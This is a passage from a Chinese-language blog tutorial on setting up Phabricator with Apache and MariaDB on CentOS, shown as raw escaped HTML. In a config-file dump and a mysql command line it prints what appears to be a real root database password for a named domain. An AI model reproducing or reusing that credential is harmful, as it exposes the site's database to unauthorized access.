&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;VirtualHost *:80&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ServerAdmin phabricator.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DocumentRoot /var/www/html/phabricator/webroot/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ServerName phabricator.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ServerAlias phabricator.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteEngine on&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteRule ^/rsrc/(.*)     -                       [L,QSA]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteRule ^/favicon.ico   -                       [L,QSA]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    RewriteRule ^(.*)$          /index.php?__path__=&lt;span class=&quot;variable&quot;&gt;$1&lt;/span&gt;  [B,L,QSA]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;Directory /var/www/html/phabricator/webroot/&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        AllowOverride All&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;lt;/Directory&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ErrorLog /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/httpd/phabricator.ihaozhuo.com-error_log&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    CustomLog /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/httpd/phabricator.ihaozhuo.com-access_log common&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;❗️❗️注意替换上面的域名。&lt;br&gt;其中&lt;code&gt;/var/www/html/phabricator/webroot&lt;/code&gt;是我的&lt;code&gt;phabricator&lt;/code&gt;安装路径，大家使用时候换成自己的即可。&lt;br&gt;安装好phabricator之后，需要使用phabricator安装目录下bin文件夹下的命令来更新下.&lt;/p&gt;
&lt;h3 id=&quot;重启apache服务：&quot;&gt;&lt;a href=&quot;#重启apache服务：&quot; class=&quot;headerlink&quot; title=&quot;重启apache服务：&quot;&gt;&lt;/a&gt;重启apache服务：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;systemctl restart httpd&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;7-设置MariaDB数据库&quot;&gt;&lt;a href=&quot;#7-设置MariaDB数据库&quot; class=&quot;headerlink&quot; title=&quot;7 设置MariaDB数据库&quot;&gt;&lt;/a&gt;7 设置MariaDB数据库&lt;/h3&gt;&lt;p&gt;配置Phabricator连接MariaDB需要的信息：&lt;/p&gt;
&lt;figure class=&quot;highlight gams&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cd /var/www/html/phabricator/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt; mysql.host &lt;span class=&quot;comment&quot;&gt;localhost&lt;/span&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;comment&quot;&gt;set mysql.port 3306&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;comment&quot;&gt;set mysql.user root&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;comment&quot;&gt;set mysql.pass &amp;lt;your-MySQL-root-password&amp;gt;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;创建数据库：&quot;&gt;&lt;a href=&quot;#创建数据库：&quot; class=&quot;headerlink&quot; title=&quot;创建数据库：&quot;&gt;&lt;/a&gt;创建数据库：&lt;/h3&gt;&lt;p&gt;出现问题：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@phabricator bin]&lt;span class=&quot;comment&quot;&gt;# ./storage upgrade&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MySQL Credentials Not Configured&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Unable to connect to MySQL using the configured credentials. You must&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;configure standard credentials before you can upgrade storage. Run these&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;commands to &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; up credentials:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; mysql.host __host__&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; mysql.user __username__&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; mysql.pass __password__&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;These standard credentials are separate from any administrative credentials&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;provided to this &lt;span class=&quot;built_in&quot;&gt;command&lt;/span&gt; with __--user__ or __--password__, and must be&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;configured correctly before you can proceed.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Raw MySQL Error: Attempt to connect to root@localhost failed with error&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#2002: Can&#39;t connect to local MySQL server through socket&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;&#39;/var/lib/mysql/mysql.sock&#39;&lt;/span&gt; (2).&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;出现这一步问题 就是因为没有配置好MySQL的连接地址信息。配置下mysql的user和pass就行。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;#  cat /var/www/html/phabricator/conf/local/local.json&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.pass&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;qwde1dsdfg3.com&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.user&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;root&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.port&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;3306&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;mysql.host&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;重新初始化数据库：&quot;&gt;&lt;a href=&quot;#重新初始化数据库：&quot; class=&quot;headerlink&quot; title=&quot;重新初始化数据库：&quot;&gt;&lt;/a&gt;重新初始化数据库：&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;# ./bin/storage upgrade&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Before running storage upgrades, you should take down the Phabricator web&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;interface and stop any running Phabricator daemons (you can &lt;span class=&quot;built_in&quot;&gt;disable&lt;/span&gt; this&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;warning with --force).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Are you ready to &lt;span class=&quot;built_in&quot;&gt;continue&lt;/span&gt;? [y/N] y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Loading quickstart template onto &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:db.packages&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160201.revision.properties.1.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160201.revision.properties.2.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160706.phame.blog.parentdomain.2.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160706.phame.blog.parentsite.1.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160707.calendar.01.stub.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160711.files.01.builtin.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Missing Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;phabricator_search       search_documentfield     corpus            Surplus Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;phabricator_search       search_documentfield     key_corpus        Missing Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;phabricator_worker       worker_archivetask       key_modified      Missing Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying schema adjustments...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Completed applying all schema adjustments.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;8-查看数据库：&quot;&gt;&lt;a href=&quot;#8-查看数据库：&quot; class=&quot;headerlink&quot; title=&quot;8 查看数据库：&quot;&gt;&lt;/a&gt;8 查看数据库：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;# mysql -uroot -pqwde1dsdfg3.com&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Welcome to the MariaDB monitor.  Commands end with ; or \g.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Your MariaDB connection id is 177&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server version: 5.5.52-MariaDB MariaDB Server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Type &lt;span class=&quot;string&quot;&gt;&#39;help;&#39;&lt;/span&gt; or &lt;span class=&quot;string&quot;&gt;&#39;\h&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; help. Type &lt;span class=&quot;string&quot;&gt;&#39;\c&#39;&lt;/span&gt; to clear the current input statement.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MariaDB [(none)]&amp;gt; show databases;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| Database                 |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| information_schema       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| mysql                    |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| performance_schema       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_almanac      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_audit        |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_auth         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_badges       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_cache        |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_calendar     |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_chatlog      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_conduit      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_config       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_conpherence  |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_countdown    |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_daemon       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_dashboard    |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_differential |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_diviner      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_doorkeeper   |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_draft        |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_drydock      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_fact         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_feed         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_file         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_flag         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_fund         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|      .......             |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61 rows &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; (0.01 sec)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;❗️❗️注：upgrade之后，show databases你会发现建立了许多phabrictor开头的数据库。&lt;/p&gt;
&lt;p&gt;###8.1 配置URL：&lt;/p&gt;
&lt;p&gt;未配置此安装的基本URI，并且在配置之前，主要功能将无法正常工作。&lt;br&gt;您应该将基本URI设置为您将用于访问Phabricator的URI，如“&lt;a href=&quot;http://phabricator.example.com/”。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://phabricator.example.com/”。&lt;/a&gt;&lt;br&gt;如果使用的端口不是80（http）或443（https），请包括协议（http或https），域名和端口号。&lt;br&gt;基于此请求，正确的设置似乎是：&lt;code&gt;http : //phabricator.ihaozhuo.com/&lt;/code&gt;&lt;br&gt;要配置基本URI，请运行以下命令。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;#  ./bin/config set phabricator.base-uri &#39;http://phabricator.ihaozhuo.com/&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Set &lt;span class=&quot;string&quot;&gt;&#39;phabricator.base-uri&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; configuration.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;9-设置防火墙&quot;&gt;&lt;a href=&quot;#9-设置防火墙&quot; class=&quot;headerlink&quot; title=&quot;9 设置防火墙&quot;&gt;&lt;/a&gt;9 设置防火墙&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;firewall-cmd --zone=public --permanent --add-service=http&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;firewall-cmd --reload&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;9-1-Phabricator-Daemons-Are-Not-Running&quot;&gt;&lt;a href=&quot;#9-1-Phabricator-Daemons-Are-Not-Running&quot; class=&quot;headerlink&quot; title=&quot;9.1 Phabricator Daemons Are Not Running&quot;&gt;&lt;/a&gt;9.1 Phabricator Daemons Are Not Running&lt;/h3&gt;&lt;p&gt;启动守护进程&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;phabricator/ $ ./bin/phd start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;10-完成安装&quot;&gt;&lt;a href=&quot;#10-完成安装&quot; class=&quot;headerlink&quot; title=&quot;10 完成安装&quot;&gt;&lt;/a&gt;10 完成安装&lt;/h3&gt;&lt;p&gt;配置phabricator：&lt;/p&gt;
